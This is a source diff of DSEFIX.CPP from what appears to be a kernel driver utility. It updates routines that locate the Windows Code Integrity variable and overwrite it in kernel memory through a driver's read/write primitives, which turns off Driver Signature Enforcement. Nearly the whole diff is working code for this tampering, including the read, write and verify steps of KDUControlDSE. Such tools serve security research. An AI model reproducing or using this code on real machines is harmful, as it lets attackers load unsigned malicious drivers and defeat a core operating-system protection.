@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2021
+*  (C) COPYRIGHT AUTHORS, 2014 - 2022
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.11
+*  VERSION:     1.20
 *
-*  DATE:        14 May 2021
+*  DATE:        14 Feb 2022
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -290,15 +290,15 @@ NTSTATUS KDUQueryCiOptions(
 }
 
 /*
-* KDUQueryVariable
+* KDUQueryCodeIntegrityVariableAddress
 *
 * Purpose:
 *
-* Find variable address.
+* Find CI variable address.
 * Depending on NT version search in ntoskrnl.exe or ci.dll
 *
 */
-ULONG_PTR KDUQueryVariable(
+ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
     _In_ ULONG NtBuildNumber
 )
 {
@@ -414,104 +414,94 @@ ULONG_PTR KDUQueryVariable(
 *
 * Purpose:
 *
-* Change ntoskrnl.exe g_CiEnabled or CI.dll g_CiOptions state.
+* Change Windows CodeIntegrity flags state.
 *
 */
 BOOL KDUControlDSE(
     _In_ PKDU_CONTEXT Context,
-    _In_ ULONG DSEValue
+    _In_ ULONG DSEValue,
+    _In_ ULONG_PTR Address
 )
 {
     BOOL bResult = FALSE;
-    ULONG_PTR variableAddress;
     ULONG ulFlags = 0;
 
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
-    variableAddress = KDUQueryVariable(Context->NtBuildNumber);
-    if (variableAddress == 0) {
+    //
+    // Read current flags state.
+    //
+    bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+        Address,
+        &ulFlags,
+        sizeof(ulFlags));
 
+    if (!bResult) {
         supPrintfEvent(kduEventError,
-            "[!] Could not query system variable address, abort.\r\n");
+            "[!] Could not query DSE state, GetLastError %lu\r\n",
+            GetLastError());
 
     }
     else {
 
-        //
-        // Read current flags state.
-        //
-        bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
-            variableAddress,
-            &ulFlags,
-            sizeof(ulFlags));
+        printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
+            (PVOID)Address,
+            ulFlags,
+            DSEValue);
 
-        if (!bResult) {
-            supPrintfEvent(kduEventError,
-                "[!] Could not query DSE state, GetLastError %lu\r\n",
-                GetLastError());
-
+        if (DSEValue == ulFlags) {
+            printf_s("[~] Warning, current value is identical to what you want to write\r\n");
         }
-        else {
 
-            printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
-                (PVOID)variableAddress,
-                ulFlags,
-                DSEValue);
+        DWORD dwLastError;
 
-            if (DSEValue == ulFlags) {
-                printf_s("[~] Warning, current value is identical to what you want to write\r\n");
-            }
+        bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
+            Address,
+            &DSEValue,
+            sizeof(DSEValue));
 
-            DWORD dwLastError;
+        dwLastError = GetLastError();
 
-            bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
-                variableAddress,
-                &DSEValue,
-                sizeof(DSEValue));
+        if (bResult) {
+
+            printf_s("[+] Kernel memory write complete, verifying data\r\n");
+
+            //
+            // Verify write.
+            //
+            ulFlags = 0;
+            bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                Address,
+                &ulFlags,
+                sizeof(ulFlags));
 
             dwLastError = GetLastError();
 
             if (bResult) {
 
-                printf_s("[+] Kernel memory write complete, verifying data\r\n");
+                bResult = (ulFlags == DSEValue);
 
-                //
-                // Verify write.
-                //
-                ulFlags = 0;
-                bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
-                    variableAddress,
-                    &ulFlags,
-                    sizeof(ulFlags));
-
-                dwLastError = GetLastError();
-
-                if (bResult) {
-
-                    bResult = (ulFlags == DSEValue);
-
-                    supPrintfEvent(
-                        (bResult == FALSE) ? kduEventError : kduEventInformation,
-                        "%s Write result verification %s\r\n",
-                        (bResult == FALSE) ? "[!]" : "[+]",
-                        (bResult == FALSE) ? "failed" : "succeeded");
+                supPrintfEvent(
+                    (bResult == FALSE) ? kduEventError : kduEventInformation,
+                    "%s Write result verification %s\r\n",
+                    (bResult == FALSE) ? "[!]" : "[+]",
+                    (bResult == FALSE) ? "failed" : "succeeded");
 
 
-                }
-                else {
-                    supPrintfEvent(kduEventError,
-                        "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
-                        dwLastError);
-
-                }
             }
             else {
                 supPrintfEvent(kduEventError,
-                    "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
+                    "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
                     dwLastError);
-            }
 
+            }
         }
+        else {
+            supPrintfEvent(kduEventError,
+                "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
+                dwLastError);
+        }
+
     }
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
